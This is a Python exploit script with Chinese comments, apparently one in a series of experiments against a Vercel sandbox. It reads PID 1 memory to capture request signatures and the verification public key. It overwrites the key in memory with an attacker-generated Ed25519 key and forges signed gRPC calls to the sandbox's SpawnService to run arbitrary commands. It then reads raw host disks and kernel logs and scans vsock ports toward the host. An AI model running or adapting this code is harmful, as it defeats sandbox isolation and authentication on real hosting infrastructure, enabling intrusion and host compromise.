# 实验J19: Spawn 进程 seccomp 对比 + 宿主设备侦察(vda/vsock/dmesg/fd)
# J18 基线: 普通进程 = 全 caps + Seccomp:2(过滤模式)
# 目标: 1)Spawn 进程 seccomp 状态 2)/dev/vda 直接读取(宿主共享磁盘?)
#       3)vsock 宿主连接探测 4)pid1 fd 窥探(agent 连接)
import os, re, subprocess, base64, time, socket, json

def run(cmd, timeout=20):
    try:
        r = subprocess.run(["bash", "-c", cmd], capture_output=True, timeout=timeout)
        return (r.stdout + r.stderr).decode(errors='replace')
    except Exception as e:
        return f"ERR {type(e).__name__}: {e}"

def read_mem_segment(start, size):
    try:
        fd = os.open("/proc/1/mem", os.O_RDONLY)
        d = os.pread(fd, size, start)
        os.close(fd)
        return d
    except Exception:
        return b""

def get_maps():
    out = []
    for line in open("/proc/1/maps"):
        parts = line.split()
        if len(parts) < 2 or parts[1][0] != "r":
            continue
        a0, a1 = parts[0].split("-")
        out.append((int(a0, 16), int(a1, 16)))
    return out

OUT = open("/tmp/j19.txt", "w", buffering=1)
def log(s):
    OUT.write(s + "\n")
    print(s, flush=True)

# ---------- [1] 捕获签名对 ----------
log("== [1] 捕获签名对 ==")
sig_pairs = []
deadline = time.time() + 30
while time.time() < deadline and not sig_pairs:
    for start, end in get_maps():
        size = min(end - start, 16 * 1024 * 1024)
        d = read_mem_segment(start, size)
        if not d:
            continue
        for m in re.finditer(rb"X-Signature: ([A-Za-z0-9+/=]{80,90})", d):
            sig = m.group(1).decode()
            tail = d[m.end():m.end()+200]
            tm = re.search(rb"X-Timestamp: (\d+)", tail)
            ts = tm.group(1).decode() if tm else "?"
            head = d[max(0, m.start()-400):m.start()]
            pm = re.search(rb"POST (/\S+) HTTP/1\.1", head)
            proc = pm.group(1).decode() if pm else "?"
            pair = (proc, ts, sig)
            if pair not in sig_pairs:
                sig_pairs.append(pair)
                log(f"  PAIR: proc={proc} ts={ts}")
    time.sleep(0.05)
if not sig_pairs:
    log("  !! 未捕获")
    OUT.close()
    print("done", flush=True)
    exit(0)

# ---------- [2] pubkey + 替换 ----------
cmdline = run("cat /proc/1/cmdline | tr '\\0' ' '")
m = re.search(r"--pubkey=([A-Za-z0-9+/=]+)", cmdline)
pub_raw = base64.b64decode(m.group(1))
log(f"[2] pubkey: {m.group(1)}")
spki = bytes.fromhex("302a300506032b6570032100") + pub_raw
open("/tmp/pub.spki", "wb").write(spki)
run("openssl pkey -pubin -inform DER -in /tmp/pub.spki -out /tmp/pub.pem 2>&1")

def verify(msg: bytes, sig_b64: str) -> bool:
    open("/tmp/msg.bin", "wb").write(msg)
    open("/tmp/sig.bin", "wb").write(base64.b64decode(sig_b64))
    out = run("openssl pkeyutl -verify -pubin -inkey /tmp/pub.pem -rawin -in /tmp/msg.bin -sigfile /tmp/sig.bin 2>&1")
    return "Signature Verified Successfully" in out

for proc, ts, sig in sig_pairs:
    if verify(proc.encode() + ts.encode(), sig):
        log(f"  proc+ts 确认")
        break
else:
    log("  !! 验证失败")
    OUT.close()
    print("done", flush=True)
    exit(0)

copies = []
for line in open("/proc/1/maps"):
    parts = line.split()
    if len(parts) < 2 or parts[1][0] != "r":
        continue
    a0, a1 = parts[0].split("-")
    start, end = int(a0, 16), int(a1, 16)
    try:
        fd = os.open("/proc/1/mem", os.O_RDONLY)
        d = os.pread(fd, min(end - start, 16 * 1024 * 1024), start)
        os.close(fd)
    except Exception:
        continue
    idx = 0
    while True:
        i = d.find(pub_raw, idx)
        if i < 0:
            break
        copies.append(start + i)
        idx = i + 1
log(f"  pubkey 副本: {[hex(c) for c in copies]}")

run("openssl genpkey -algorithm ED25519 -out /tmp/atk_priv.pem 2>&1")
run("openssl pkey -in /tmp/atk_priv.pem -pubout -outform DER -out /tmp/atk_pub.der 2>&1")
atk_pub = open("/tmp/atk_pub.der", "rb").read()[-32:]
fdm = os.open("/proc/1/mem", os.O_RDWR)
backups = []
for off in copies:
    backups.append((off, os.pread(fdm, 32, off)))
    os.pwrite(fdm, atk_pub, off)
log(f"  已替换 {len(copies)} 处")

def sign(msg: bytes) -> bytes:
    open("/tmp/msg.bin", "wb").write(msg)
    run("openssl pkeyutl -sign -inkey /tmp/atk_priv.pem -rawin -in /tmp/msg.bin -out /tmp/sig.bin 2>&1")
    return open("/tmp/sig.bin", "rb").read()

SPAWN = "/vercel.sandbox.spawn.v1.SpawnService/Spawn"
def spawn_exec(cmd_str, timeout=25):
    jb = json.dumps({"command": "/bin/sh", "arguments": ["-c", cmd_str]}).encode()
    body = b"\x00" + len(jb).to_bytes(4, "big") + jb
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect("/run/vercel/share/init.sock")
        ts = str(int(time.time()))
        req = (f"POST {SPAWN} HTTP/1.1\r\nHost: localhost\r\n"
               f"Content-Type: application/grpc+json\r\nContent-Length: {len(body)}\r\n"
               f"X-Signature: {base64.b64encode(sign(SPAWN.encode() + ts.encode())).decode()}\r\n"
               f"X-Timestamp: {ts}\r\n\r\n").encode() + body
        s.sendall(req)
        data = b""
        try:
            while True:
                c = s.recv(8192)
                if not c:
                    break
                data += c
        except socket.timeout:
            pass
        s.close()
        head, _, respbody = data.partition(b"\r\n\r\n")
        # 解 chunked
        raw = b""
        i = 0
        while i < len(respbody):
            j = respbody.find(b"\r\n", i)
            if j < 0:
                break
            try:
                ln = int(respbody[i:j], 16)
            except Exception:
                break
            if ln == 0:
                break
            raw += respbody[j+2:j+2+ln]
            i = j + 2 + ln + 2
        # 解 grpc 帧
        out = b""
        k = 0
        while k + 5 <= len(raw):
            ln = int.from_bytes(raw[k+1:k+5], "big")
            if ln <= 0 or k + 5 + ln > len(raw):
                break
            ev = raw[k+5:k+5+ln]
            try:
                d = json.loads(ev)
                if "stdout" in d:
                    out += base64.b64decode(d["stdout"])
            except Exception:
                pass
            k += 5 + ln
        return out.decode(errors="replace")
    except Exception as e:
        return f"EXC {type(e).__name__}: {e}"

# ---------- [3] 侦察 ----------
log("== [3] Spawn 进程侦察 ==")
log("-- seccomp/LSM 状态 --")
log(spawn_exec("grep -E 'Seccomp|NoNewPrivs' /proc/self/status; echo ---; cat /proc/self/seccomp 2>&1; echo ---; cat /proc/self/attr/current 2>&1"))
log("-- /dev 关键设备 --")
log(spawn_exec("ls -la /dev/vd* /dev/vsock /dev/fuse /dev/mem /dev/port /dev/kmsg 2>&1"))
log("-- /dev/vda 直接读(前4KB hexdump) --")
log(spawn_exec("dd if=/dev/vda bs=512 count=8 2>&1 | od -A x -t x1z | head -20"))
log("-- /dev/vdb 读(超级块) --")
log(spawn_exec("dd if=/dev/vdb bs=512 count=2 2>&1 | od -A x -t x1z | head -8"))
log("-- dmesg --")
log(spawn_exec("dmesg 2>&1 | tail -15"))
log("-- modules_disabled + lockdown --")
log(spawn_exec("cat /proc/sys/kernel/modules_disabled 2>&1; cat /sys/kernel/security/lockdown 2>&1; cat /proc/sys/kernel/unprivileged_userns_clone 2>&1"))
log("-- pid1 fd 列表 --")
log(spawn_exec("ls -la /proc/1/fd/ 2>&1"))
log("-- vsock 探测 CID2/CID3 常见端口 --")
VSOCK_PROBE = '''
import socket
for cid in (2, 3):
    for port in (22, 80, 443, 2375, 5000, 8000, 8080, 8888, 9000, 3000, 10000, 9999):
        try:
            s = socket.socket(40, 1)
            s.settimeout(1.0)
            s.connect((cid, port))
            print("VSOCK OPEN", cid, port, flush=True)
            s.close()
        except Exception:
            pass
print("vsock probe done")
'''
log(spawn_exec("python3 -c " + repr(VSOCK_PROBE)))
log("-- net interfaces --")
log(spawn_exec("cat /proc/net/dev; echo ---; ls /sys/class/net/"))

# ---------- [4] 恢复 ----------
log("[4] 恢复 pubkey")
for off, orig in backups:
    os.pwrite(fdm, orig, off)
os.close(fdm)
log("done")
OUT.close()
